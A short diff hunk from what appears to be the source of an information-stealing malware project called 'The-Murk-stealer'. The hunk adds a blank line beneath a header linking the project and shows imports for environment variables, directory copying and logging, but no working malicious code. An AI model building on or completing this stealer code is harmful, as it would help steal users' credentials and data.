@@ -9,6 +9,7 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
+
 from os import getenv
 from shutil import copytree,ignore_patterns
 from manager.logger import Log
